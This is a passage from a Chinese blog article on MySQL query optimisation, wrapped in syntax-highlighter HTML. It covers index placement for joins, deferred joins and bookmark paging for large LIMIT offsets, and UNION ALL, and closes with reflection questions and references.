class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT A.xx,B.yy \r\nFROM A INNER JOIN B USING(c)\r\nWHERE A.xx IN (5,6)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d18747122052-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d18747122052-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d18747122052-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d18747122052-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d18747122052-1\"><span class=\"crayon-i\">SELECT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">xx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">yy </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d18747122052-2\"><span class=\"crayon-i\">FROM</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">INNER </span><span class=\"crayon-i\">JOIN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">USING</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d18747122052-3\"><span class=\"crayon-i\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">xx </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d18747122052-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>假设MySQL按照查询中的关联顺序A、B来进行关联操作，那么可以用下面的伪代码表示MySQL如何完成这个查询：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d1d716037421\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nouter_iterator = SELECT A.xx,A.c FROM A WHERE A.xx IN (5,6);\r\nouter_row = outer_iterator.next;\r\nwhile(outer_row) {\r\n    inner_iterator = SELECT B.yy FROM B WHERE B.c = outer_row.c;\r\n    inner_row = inner_iterator.next;\r\n    while(inner_row) {\r\n        output[inner_row.yy,outer_row.xx];\r\n        inner_row = inner_iterator.next;\r\n    }\r\n    outer_row = outer_iterator.next;\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d1d716037421-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d1d716037421-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d1d716037421-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d1d716037421-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d1d716037421-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d1d716037421-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d1d716037421-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d1d716037421-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d1d716037421-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d1d716037421-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d1d716037421-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d1d716037421-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d1d716037421-1\"><span class=\"crayon-v\">outer_iterator</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SELECT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">xx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">FROM</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">xx </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d1d716037421-2\"><span class=\"crayon-v\">outer_row</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">outer_iterator</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d1d716037421-3\"><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">outer_row</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d1d716037421-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">inner_iterator</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">SELECT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">yy </span><span class=\"crayon-i\">FROM</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">outer_row</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d1d716037421-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">inner_row</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">inner_iterator</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d1d716037421-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">inner_row</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d1d716037421-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">output</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">inner_row</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">yy</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">outer_row</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">xx</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d1d716037421-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">inner_row</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">inner_iterator</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d1d716037421-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d1d716037421-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">outer_row</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">outer_iterator</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d1d716037421-11\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d1d716037421-12\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0027 seconds] -->\r\n<p>可以看到，最外层的查询是根据<code>A.xx</code>列来查询的，<code>A.c</code>上如果有索引的话，整个关联查询也不会使用。再看内层的查询，很明显<code>B.c</code>上如果有索引的话，能够加速查询，因此只需要在关联顺序中的第二张表的相应列上创建索引即可。</p>\n<h5>优化LIMIT分页</h5>\n<p>当需要分页操作时，通常会使用<code>LIMIT</code>加上偏移量的办法实现，同时加上合适的<code>ORDER BY</code>字句。如果有对应的索引，通常效率会不错，否则，MySQL需要做大量的文件排序操作。</p>\n<p>一个常见的问题是当偏移量非常大的时候，比如：<code>LIMIT 10000 20</code>这样的查询，MySQL需要查询10020条记录然后只返回20条记录，前面的10000条都将被抛弃，这样的代价非常高。</p>\n<p>优化这种查询一个最简单的办法就是尽可能的使用覆盖索引扫描，而不是查询所有的列。然后根据需要做一次关联查询再返回所有的列。对于偏移量很大时，这样做的效率会提升非常大。考虑下面的查询：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d22217038873\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT film_id,description FROM film ORDER BY title LIMIT 50,5;\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d22217038873-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d22217038873-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d22217038873-1\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-v\">film_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">description </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">film </span><span class=\"crayon-e\">ORDER </span><span class=\"crayon-e\">BY </span><span class=\"crayon-e\">title </span><span class=\"crayon-i\">LIMIT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d22217038873-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>如果这张表非常大，那么这个查询最好改成下面的样子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d25047360503\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT film.film_id,film.description\r\nFROM film INNER JOIN (\r\n    SELECT film_id FROM film ORDER BY title LIMIT 50,5\r\n) AS tmp USING(film_id);\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d25047360503-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d25047360503-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d25047360503-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d25047360503-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d25047360503-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d25047360503-1\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-v\">film</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">film_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">film</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">description</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d25047360503-2\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">film </span><span class=\"crayon-e\">INNER </span><span class=\"crayon-e\">JOIN</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d25047360503-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">SELECT </span><span class=\"crayon-e\">film_id </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">film </span><span class=\"crayon-e\">ORDER </span><span class=\"crayon-e\">BY </span><span class=\"crayon-e\">title </span><span class=\"crayon-i\">LIMIT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d25047360503-4\"><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tmp </span><span class=\"crayon-e\">USING</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">film_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d25047360503-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>这里的延迟关联将大大提升查询效率，让MySQL扫描尽可能少的页面，获取需要访问的记录后在根据关联列回原表查询所需要的列。</p>\n<p>有时候如果可以使用书签记录上次取数据的位置，那么下次就可以直接从该书签记录的位置开始扫描，这样就可以避免使用<code>OFFSET</code>，比如下面的查询：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d29852100021\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT id FROM t LIMIT 10000, 10;\r\n改为：\r\nSELECT id FROM t WHERE id &gt; 10000 LIMIT 10;\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d29852100021-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d29852100021-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d29852100021-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d29852100021-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d29852100021-1\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-e\">id </span><span class=\"crayon-i\">FROM</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">LIMIT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d29852100021-2\">改为：</div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d29852100021-3\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-e\">id </span><span class=\"crayon-i\">FROM</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">WHERE </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">LIMIT</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d29852100021-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>其他优化的办法还包括使用预先计算的汇总表，或者关联到一个冗余表，冗余表中只包含主键列和需要做排序的列。</p>\n<h5>优化UNION</h5>\n<p>MySQL处理<code>UNION</code>的策略是先创建临时表，然后再把各个查询结果插入到临时表中，最后再来做查询。因此很多优化策略在<code>UNION</code>查询中都没有办法很好的时候。经常需要手动将<code>WHERE</code>、<code>LIMIT</code>、<code>ORDER BY</code>等字句“下推”到各个子查询中，以便优化器可以充分利用这些条件先优化。</p>\n<p>除非确实需要服务器去重，否则就一定要使用<code>UNION ALL</code>，如果没有<code>ALL</code>关键字，MySQL会给临时表加上<code>DISTINCT</code>选项，这会导致整个临时表的数据做唯一性检查，这样做的代价非常高。当然即使使用ALL关键字，MySQL总是将结果放入临时表，然后再读出，再返回给客户端。虽然很多时候没有这个必要，比如有时候可以直接把每个子查询的结果返回给客户端。</p>\n<h4>结语</h4>\n<p>理解查询是如何执行以及时间都消耗在哪些地方，再加上一些优化过程的知识，可以帮助大家更好的理解MySQL，理解常见优化技巧背后的原理。希望本文中的原理、示例能够帮助大家更好的将理论和实践联系起来，更多的将理论知识运用到实践中。</p>\n<p>其他也没啥说的了，给大家留两个思考题吧，可以在脑袋里想想答案，这也是大家经常挂在嘴边的，但很少有人会思考为什么？</p>\n<ol>\n<li>有非常多的程序员在分享时都会抛出这样一个观点：尽可能不要使用存储过程，存储过程非常不容易维护，也会增加使用成本，应该把业务逻辑放到客户端。既然客户端都能干这些事，那为什么还要存储过程？</li>\n<li><code>JOIN</code>本身也挺方便的，直接查询就好了，为什么还需要视图呢？</li>\n</ol>\n<h4>参考资料</h4>\n<p>[1] <a href=\"https://link.jianshu.com?t=http://union-click.jd.com/jdc?d=6vMwSD\" target=\"_blank\" rel=\"nofollow\">姜承尧 著；MySQL技术内幕-InnoDB存储引擎；机械工业出版社，2013</a><br>\n[2] <a href=\"https://link.jianshu.com?t=http://union-click.jd.com/jdc?d=wMESxy\" target=\"_blank\" rel=\"nofollow\">Baron Scbwartz 等著；宁海元 周振兴等译；高性能MySQL（第三版）; 电子工业出版社， 2013</a><br>\n[3] <a href=\"https://link.jianshu.com?t=https://segmentfault.com/a/1190000004690721\" target=\"_blank\" rel=\"nofollow\">由 B-/B+树看 MySQL索引结构</a></p>\n<blockquote><p>备注：水平有限，难免疏漏，如果问题请留言</p></blockquote>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114041\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114041votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114041\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 12 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            